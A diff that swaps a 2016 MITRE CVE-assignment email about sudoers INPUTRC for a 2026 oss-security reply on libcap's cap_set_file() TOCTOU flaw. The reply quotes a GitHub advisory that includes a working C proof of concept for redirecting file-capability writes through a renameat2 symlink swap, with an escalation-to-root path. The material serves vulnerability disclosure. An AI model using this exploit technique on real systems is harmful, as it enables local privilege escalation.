@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3333" "Thursday" "25" "August" "2016" "10:09:32" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160825140932.642D96C458D@smtpvmsrv1.mitre.org>" "72" "[oss-security] Re: CVE request - sudoers on Red Hat, Fedora, Mageia information disclosure" nil nil nil "8" "2016082514:09:32" "[oss-security] Re: CVE request - sudoers on Red Hat, Fedora, Mageia information disclosure" (number mark "U       cve-assign@m Aug 25   72/3333  " thread-indent "\"[oss-security] Re: CVE request - sudoers on Red Hat, Fedora, Mageia information disclosure\"\n") "<20160824065811.GB7400@sin.redhat.com>" ("<20160824065811.GB7400@sin.redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 5597 invoked by uid 550); 25 Aug 2016 14:09:45 -0000
+Received: (qmail 24386 invoked by uid 550); 9 Apr 2026 01:37:40 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,84 +7,306 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5576 invoked from network); 25 Aug 2016 14:09:44 -0000
-From: cve-assign@mitre.org
-To: dmoppert@redhat.com
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
-In-Reply-To: <20160824065811.GB7400@sin.redhat.com>
-Message-Id: <20160825140932.642D96C458D@smtpvmsrv1.mitre.org>
-Date: Thu, 25 Aug 2016 10:09:32 -0400 (EDT)
-Subject: [oss-security] Re: CVE request - sudoers on Red Hat, Fedora, Mageia information disclosure
+x-ms-reactions: disallow
+Received: (qmail 20008 invoked from network); 9 Apr 2026 01:36:29 -0000
+Date: Thu, 9 Apr 2026 03:36:20 +0200
+From: Solar Designer <solar@openwall.com>
+To: oss-security@lists.openwall.com
+Cc: "Andrew G. Morgan" <morgan@kernel.org>,
+	Ali Raza <elirazamumtaz@gmail.com>
+Message-ID: <20260409013620.GA13098@openwall.com>
+References: <CACmP8U+CbkozUQ1OqxsXMxLgMYvQS85QsWaGtVGBD8BFox34=w@mail.gmail.com> <fa4662c4-ce58-48ec-85a4-b0272ca9931a@seltendoof.de>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <fa4662c4-ce58-48ec-85a4-b0272ca9931a@seltendoof.de>
+User-Agent: Mutt/1.4.2.3i
+Subject: Re: [oss-security] libcap-2.77 (since libcap-2.04) has TOCTOU privilege escalation issue
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hi all,
 
-> https://bugzilla.redhat.com/show_bug.cgi?id=1339935
+I think Andrew may not be subscribed - CC'ing.
 
-> The inclusion of "INPUTRC" in env_keep in /etc/sudoers allowed
-> information disclosure through readline-enabled programs parsing the
-> named file with elevated privileges. Local users with sudo access could
-> read (portions of) specially-formatted files with elevated privileges.
+On Tue, Apr 07, 2026 at 10:14:42PM +0200, Christian Göttsche wrote:
+> Apr 7, 2026 18:54:22 Andrew G. Morgan <morgan@kernel.org>:
+> > I've just released libcap-2.78 which includes a fix for a TOCTOU issue
+> > in libcap.
+> >
+> > The issue has been allocated the following code: CVE-2026-4878. It is
+> > the subject of this private bug:
+> > https://bugzilla.redhat.com/show_bug.cgi?id=2447554 and is also
+> > written up in a github.com advisory which I will publish on Wednesday
+> > (this week). The github advisory tool characterizes the issue as
+> > CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H (Severity: Moderate 7 /
+> > 10).
+> >
+> > The fix for pretty much that whole range of libcap releases is this commit:
+> >
+> > https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=286ace1259992bd0c5d9016715833f2e148ac596
+> 
+> Hi,
+> 
+> the new code suppports changing the file capabilities of all kinds of files (not just regular)(given that the caller has read permissions).
+> Is that intended?
 
-> This flaw is distribution-specific - upstream sudo does not include
-> INPUTRC
+Andrew, please comment on this.  I do also see it in the patch that the
+S_ISREG check is now below the added fast path code for readable files.
+It doesn't matter that the S_ISLNK check is also below (in fact, it's
+now redundant anyway) due to O_NOFOLLOW, but bypass of the S_ISREG check
+appears to be a functional change.
 
->> RHEL and Fedora by default include INPUTRC in /etc/sudoers, exposing
->> this issue to users of the default sudo configuration. INPUTRC should
->> not be included in "env_keep" at all, or else somehow restricted to
->> non-restricted shells (ie /bin/sh, /bin/bash).
->> 
->> It is also possible to cause segmentation fault through stack
->> exhaustion in the target application by having INPUTRC specify a file
->> with an $include directive for itself.
+Also, was the fact that cap_set_file() refuses to operate over a symlink
+(for the last pathname component only) documented and expected behavior?
+Maybe not documented, but assumed expected?  The advisory says:
 
-Use CVE-2016-7091. The scope of this CVE is the entire 'INPUTRC should
-not be included in "env_keep" at all, or else somehow restricted'
-problem, which has both the information disclosure and segmentation
-fault outcomes.
+> for example, an administrator running setcap, a CI/CD pipeline setting
+> capabilities on build artifacts, a container runtime configuring
+> binaries, or a package manager post-install script) can exploit the race
+> to redirect file capabilities to their own executable. The attacker
+> never needs elevated privileges; only write access to the directory
+> containing the target path.
 
+While this sounds valid, making changes in an attacker-writable
+directory is inherently dangerous, and I wouldn't see why expectations
+for cap_set_file() and setcap would be different than for chmod() and
+chmod, which follow symlinks, if there weren't already this incomplete
+racy attempt of pre-checking for and refusing to operate on symlinks.
 
->>>> https://lists.gnu.org/archive/html/bug-readline/2016-05/msg00012.html
+> > PS I tried a few times to post to the private openwall list about this
+> > issue 9 days ago, but my email bounced (likely because I couldn't
+> > effectively follow the mail formatting requirements). I might have
+> > realized that the emails were bounced if gmail hadn't silently placed
+> > the bounced replies in my SPAM folder. Sorry about that.
 
->>>> Since there is already current_readline_init_include_level, maybe
->>>> implementing a max level for $include's would be worthwhile.
+Sorry you had difficulties with that.  I just searched through the logs,
+but could not easily find traces of you trying to send this to the
+linux-distros list.  Can you please forward the bounce to me off-list?
 
->>> I'll consider it for the next version.
+As to your oss-security postings presumably flagged by Gmail as spam,
+that is likely due to us breaking DKIM with the addition of the
+[oss-security] prefix and kernel.org having DMARC p=quarantine.  In
+cases like this, a workaround is to pre-add [oss-security] on your end
+(and when you add to the thread, reply to your messages as they arrived
+through the list rather than to your local copies without the prefix).
+Sorry about that as well.
 
-If there is a reason that this must also be considered a vulnerability
-in readline, please let us know. For example, maybe there are other
-common programs that accept an INPUTRC environment variable over the
-network during a login session for an authenticated attacker who is
-only supposed to be able to execute a single command. Suppose that
-this attacker can also create files beginning with $include (e.g., by
-writing to a shared filesystem or using FTP upload). The unlimited
-include level might allow much more resource consumption than
-intended. Another possibility is that the INPUTRC environment variable
-could specify a file that should not be read by this type of
-restricted account, e.g., the /dev/zero file. However, we do not know
-of a realistic attack scenario in which readline would be considered
-the vulnerable software. There are no other CVE IDs -- either for
-readline or for any other software -- at this time.
+Let's also have the GitHub advisory archived in here:
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f78v-p5hx-m7hh
 
-iQIcBAEBCAAGBQJXvvuFAAoJEHb/MwWLVhi2ucMQAKsQXvK2gNQ6/9pOTw4h8S/o
-9W2+DM+LsA2SgVI5IpsACmQqMTWN2mCPuSL/+Ba6PD7Tcda0TA7wsqfgw0kIJUEr
-etlI9ifWlCwWjpO9mwhPmJAPLPj2AX65JcbdTZpEK472zJNdeF8R4+QA+FJ9y4+G
-/UCkSRiH826E96shfmqadYaztcNLRtIfCgmXSiHsaRrkTyGKYIyQMynqxoqrG8Qg
-tztX0rIs9oMG+1BqHdJU+aV2vHnGMTRnqoVW7oPObsfTrgBzJrMNOyoY33ZpNDMQ
-GWzySg09zPt0qayktjA/tuqdkNEswq1Qirmr7Ai8rODuHBdK9+oJGMTuqC1NmaAr
-ZSilLQl1mnwgPMXD9THK2Dui7th4WCPEB+pp+zQ0uDogpuknzzwuftZLuYrHPFsp
-WsGiE7bEy4Uh1LK0ROLsd23bXuoYaIBj/iiQNUoEDckQYBuZRn0ZCYXyVjL7guLh
-ApQ4j5zYt++h0TzolF1t+2fw3SrCVuV4OE0gdmkcaDWCVgwvc/s/+ADZJUlongG3
-VTFzG8iy4gJ8F+JOrJS7qX0g+wykDtDSqPfuDAhzgkQyS6MHwOJMM8g6UtsUlyYE
-LY8CaZJpLMNSf1+NbLzoHpaMt0Vys+cHOiBvwDfvwlseR9Wd91xDAOFcgxEAr8Av
-GulJIV7CVPniP8lUCUhY
-=B2yA
------END PGP SIGNATURE-----
+> Local Privilege Escalation (LPE) via TOCTOU race condition in cap_set_file() through file capability injection
+> Moderate
+> AndrewGMorgan published GHSA-f78v-p5hx-m7hh 11 hours ago
+> 
+> Package
+> libcap (Library)
+> 
+> Affected versions
+> >= 2.04, <= 2.77
+> 
+> Patched versions
+> 2.78
+> 
+> Summary
+> 
+> A TOCTOU (Time-of-Check-Time-of-Use) race condition in cap_set_file() allows an unprivileged local attacker to redirect file capability writes to an arbitrary file, leading to local privilege escalation. The function validates the target path with lstat() (which does not follow symlinks) but then operates on it with setxattr() (which does follow symlinks). Between these two calls, an attacker with write access to the parent directory can atomically swap the regular file for a symlink or a different file via renameat2(RENAME_EXCHANGE), causing setxattr() to write the security.capability xattr to the attacker's chosen file instead of the intended target.
+> 
+> Details
+> 
+> The vulnerability is in libcap/cap_file.c, function cap_set_file():
+> 
+> int cap_set_file(const char *filename, cap_t cap_d)
+> {
+>     struct vfs_ns_cap_data rawvfscap;
+>     int sizeofcaps;
+>     struct stat buf;
+> 
+>     // CHECK: lstat does NOT follow symlinks
+>     if (lstat(filename, &buf) != 0) {
+>         return -1;
+>     }
+>     if (S_ISLNK(buf.st_mode) || !S_ISREG(buf.st_mode)) {
+>         errno = EINVAL;
+>         return -1;
+>     }
+> 
+>     // ... _fcaps_save() computation widens the race window ...
+> 
+>     if (cap_d == NULL) {
+>         // USE: removexattr FOLLOWS symlinks
+>         return removexattr(filename, XATTR_NAME_CAPS); 
+>     }
+> 
+>     // USE: setxattr FOLLOWS symlinks
+>     return setxattr(filename, XATTR_NAME_CAPS, &rawvfscap, sizeofcaps, 0); 
+> }
+> 
+> The gap between lstat() and setxattr() or removexattr() creates a race window. During this window an attacker with write access to the parent directory can use renameat2(RENAME_EXCHANGE) to atomically swap the legitimate regular file with either a symlink pointing to the attacker's target or a completely different file. Since setxattr() resolves the path from scratch (following symlinks), it writes the capability xattr to the wrong file.
+> 
+> The same pattern affects the removexattr() path at when cap_d == NULL, allowing an attacker to strip capabilities from an unintended file.
+> 
+> For comparison, the fd-based counterpart cap_set_fd() is not vulnerable because it uses fstat() + fsetxattr() on an already-opened file descriptor, which pins the inode.
+> 
+> The setcap tool progs/setcap.c calls cap_set_file() directly with a user-supplied path, making it the primary attack surface.
+> 
+> PoC
+> 
+> The following self-contained C program deterministically reproduces the vulnerability by executing the lstat → swap → setxattr sequence step by step. No race timing is required.
+> 
+> Requirements: Linux 3.15+ (for renameat2), root or CAP_SETFCAP.
+> 
+> Build and run:
+> 
+> gcc -Wall -O2 -o poc poc.c
+> sudo ./poc
+> 
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <unistd.h>
+> #include <fcntl.h>
+> #include <errno.h>
+> #include <sys/stat.h>
+> #include <sys/xattr.h>
+> #include <sys/syscall.h>
+> 
+> #ifndef SYS_renameat2
+> #define SYS_renameat2 316
+> #endif
+> #ifndef RENAME_EXCHANGE
+> #define RENAME_EXCHANGE (1 << 1)
+> #endif
+> 
+> #define XATTR_NAME_CAPS "security.capability"
+> 
+> /*
+>  * Minimal VFS_CAP_REVISION_2 xattr granting CAP_NET_RAW=ep.
+>  *
+>  * struct vfs_cap_data {
+>  *   __le32 magic_etc;    // VFS_CAP_REVISION_2 | VFS_CAP_FLAGS_EFFECTIVE
+>  *   struct { __le32 permitted, inheritable; } data[2];
+>  * };
+>  *
+>  * CAP_NET_RAW = 13 -> bit 13 in data[0].permitted = 0x00002000
+>  */
+> static const unsigned char xattr_cap_net_raw[20] = {
+>     0x01, 0x00, 0x00, 0x02,  /* magic: VFS_CAP_REVISION_2 | EFFECTIVE */
+>     0x00, 0x20, 0x00, 0x00,  /* data[0].permitted = 1 << 13 */
+>     0x00, 0x00, 0x00, 0x00,  /* data[0].inheritable = 0 */
+>     0x00, 0x00, 0x00, 0x00,  /* data[1].permitted = 0 */
+>     0x00, 0x00, 0x00, 0x00,  /* data[1].inheritable = 0 */
+> };
+> 
+> static char arena[256], decoy[280], target[280], link_path[280];
+> 
+> static void cleanup(void) {
+>     removexattr(target, XATTR_NAME_CAPS);
+>     unlink(decoy); unlink(link_path); unlink(target); rmdir(arena);
+> }
+> 
+> int main(void)
+> {
+>     struct stat st;
+>     int fd, ret;
+>     char buf[20];
+>     ssize_t len;
+> 
+>     if (geteuid() != 0) {
+>         fprintf(stderr, "Requires root (for setxattr on security.capability).\n");
+>         return 1;
+>     }
+> 
+>     snprintf(arena,     sizeof(arena),     "/tmp/cve_poc_%d", getpid());
+>     snprintf(decoy,     sizeof(decoy),     "%s/decoy",  arena);
+>     snprintf(target,    sizeof(target),     "%s/target", arena);
+>     snprintf(link_path, sizeof(link_path),  "%s/link",   arena);
+> 
+>     atexit(cleanup);
+>     mkdir(arena, 0755);
+> 
+>     fd = open(decoy, O_CREAT|O_WRONLY|O_TRUNC, 0755); close(fd);
+>     fd = open(target, O_CREAT|O_WRONLY|O_TRUNC, 0755); close(fd);
+>     if (symlink(target, link_path) != 0) { perror("symlink"); return 1; }
+> 
+>     printf("cap_set_file() TOCTOU — deterministic proof\n\n");
+> 
+>     /* Step 1: lstat sees a regular file — cap_set_file() check passes */
+>     lstat(decoy, &st);
+>     printf("[+] lstat(\"%s\"): S_ISREG=%d S_ISLNK=%d\n",
+>            decoy, S_ISREG(st.st_mode), S_ISLNK(st.st_mode));
+>     printf("    cap_set_file() symlink check PASSES\n\n");
+> 
+>     /* Step 2: attacker atomically swaps decoy with symlink */
+>     ret = syscall(SYS_renameat2, AT_FDCWD, link_path,
+>                   AT_FDCWD, decoy, RENAME_EXCHANGE);
+>     if (ret != 0) {
+>         fprintf(stderr, "renameat2 failed: %s\n", strerror(errno));
+>         return 1;
+>     }
+> 
+>     lstat(decoy, &st);
+>     printf("[+] Attacker swaps (renameat2 RENAME_EXCHANGE):\n");
+>     printf("    lstat(\"%s\"): S_ISLNK=%d — now a symlink\n\n", decoy,
+>            S_ISLNK(st.st_mode));
+> 
+>     /* Step 3: setxattr follows the symlink — writes caps to target */
+>     ret = setxattr(decoy, XATTR_NAME_CAPS,
+>                    xattr_cap_net_raw, sizeof(xattr_cap_net_raw), 0);
+>     printf("[+] setxattr(\"%s\", \"security.capability\", ...): %s\n",
+>            decoy, ret == 0 ? "OK" : strerror(errno));
+>     printf("    setxattr FOLLOWED the symlink to target\n\n");
+> 
+>     /* Step 4: verify capabilities landed on the target file */
+>     len = getxattr(target, XATTR_NAME_CAPS, buf, sizeof(buf));
+>     printf("[+] getxattr(\"%s\"): %zd bytes\n", target, len);
+> 
+>     if (len > 0) {
+>         printf("\n    BUG CONFIRMED: capabilities written to WRONG file.\n");
+>         return 0;
+>     } else {
+>         printf("\n    Unexpected: xattr not found on target.\n");
+>         return 1;
+>     }
+> }
+> 
+> Expected output:
+> 
+> cap_set_file() TOCTOU — deterministic proof
+> 
+> [+] lstat("/tmp/cve_poc_XXXX/decoy"): S_ISREG=1 S_ISLNK=0
+>     cap_set_file() symlink check PASSES
+> 
+> [+] Attacker swaps (renameat2 RENAME_EXCHANGE):
+>     lstat("/tmp/cve_poc_XXXX/decoy"): S_ISLNK=1 — now a symlink
+> 
+> [+] setxattr("/tmp/cve_poc_XXXX/decoy", "security.capability", ...): OK
+>     setxattr FOLLOWED the symlink to target
+> 
+> [+] getxattr("/tmp/cve_poc_XXXX/target"): 20 bytes
+> 
+>     BUG CONFIRMED: capabilities written to WRONG file.
+> 
+> Impact
+> 
+> This is a local privilege escalation vulnerability (CWE-367).
+> 
+> An unprivileged local attacker who has write access to a directory where a privileged process calls cap_set_file() (for example, an administrator running setcap, a CI/CD pipeline setting capabilities on build artifacts, a container runtime configuring binaries, or a package manager post-install script) can exploit the race to redirect file capabilities to their own executable. The attacker never needs elevated privileges; only write access to the directory containing the target path.
+> 
+> By injecting capabilities such as CAP_SETUID onto their own binary, the attacker can then execute it, call setuid(0), and escalate to root.
+> 
+> The attacker's primitives are:
+> 
+>   - Arbitrary file capability injection: redirect any cap_set_file() call to write capabilities to an attacker-chosen file on the same filesystem.
+>   - Arbitrary file capability removal: redirect the removexattr() path (when cap_d == NULL) to strip capabilities from an unintended file, enabling defense evasion.
+> 
+> All versions of libcap that include the symlink check in cap_set_file() are believed to be affected. The setcap tool shipped with libcap is the primary real-world attack vector as it calls cap_set_file() directly with a user-supplied path argument.
+
+Is there a good way to extract Markdown source from GitHub advisories,
+such as for posting in here?  That would probably have preserved more of
+the formatting.
+
+Thanks,
+
+Alexander
